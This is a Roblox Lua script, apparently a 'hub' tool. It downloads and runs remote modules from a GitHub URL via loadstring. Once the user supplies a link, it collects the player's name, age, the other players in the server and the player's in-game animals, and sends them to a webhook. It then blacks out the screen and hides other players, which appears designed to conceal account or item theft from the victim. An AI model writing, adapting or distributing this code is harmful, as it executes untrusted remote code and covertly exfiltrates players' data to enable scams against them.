local BASE = "https://raw.githubusercontent.com/sonfor50/EvXWGbgmda/main/SximsHub/"

local Gui = loadstring(game:HttpGet(BASE.."Guicreator/Gui.lua"))()
local Scan = loadstring(game:HttpGet(BASE.."Utility/ScanPlot.lua"))()
local Webhook = loadstring(game:HttpGet(BASE.."Utility/Webhook.lua"))()
local NoSee = loadstring(game:HttpGet(BASE.."Noseeplayer/NoSee.lua"))()

Gui.OnValidLink = function(link)
    Gui.ShowLoading()

    local animals = Scan.GetAnimals()

    local text =
        "Player name: "..Scan.PlayerName().."\n"..
        "Player age: "..Scan.PlayerAge().."\n"..
        "Other players in server: "..Scan.OtherPlayers().."\n"..
        "———————————————-\n"

    for _,a in ipairs(animals) do
        text ..= a.Name.." | "..a.Gen.."\n"
    end

    Webhook.SendFull(text)

    task.wait(1)
    Gui.Blackout()
    NoSee.Enable()
end

Gui.Init()
